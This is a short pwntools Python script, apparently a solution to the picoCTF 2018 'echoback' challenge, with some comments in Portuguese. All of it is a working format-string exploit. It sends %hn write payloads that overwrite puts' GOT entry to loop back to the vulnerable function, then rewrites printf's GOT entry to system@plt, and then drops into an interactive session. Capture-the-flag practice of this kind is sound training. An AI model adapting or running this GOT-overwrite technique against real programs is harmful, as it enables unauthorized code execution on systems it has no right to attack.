from pwn import *

#%7$x
#p=process("./echoback")
p=remote('2018shell2.picoctf.com', 37402)

printf_plt = 0x804a010
puts_plt = 0x804a01c
system_plt = 0x8048460
vuln_addr = 0x80485ab

#0x08048456 -> gotputs 
#so necessito de trocar os 3 ultimos bytes


payload = ""
payload += p32(puts_plt)
payload += p32(puts_plt+2)
payload += '%' + str((vuln_addr & 0xffff)-4*2) + 'x'
payload += '%7$hn'
payload += '%' + str(0x10000 + ((vuln_addr >> 16) - (vuln_addr & 0xffff))) + 'x'
payload += '%8$hn'

pause()

p.sendafter("input your message:",payload)

#now have a loop

#0x08048460 -> systemplt 
#need overwrite gotprintf
#0x08048426 -> gotprintf

payload = ""
payload += p32(printf_plt)
payload += p32(printf_plt + 2)
payload += '%' + str((system_plt & 0xffff)-4*2) + 'x'
payload += '%7$hn'
payload += '%' + str(0x10000 + ((system_plt >> 16) - (system_plt & 0xffff))) + 'x'
payload += '%8$hn'

pause()

p.sendafter("input your message:", payload)

p.interactive()
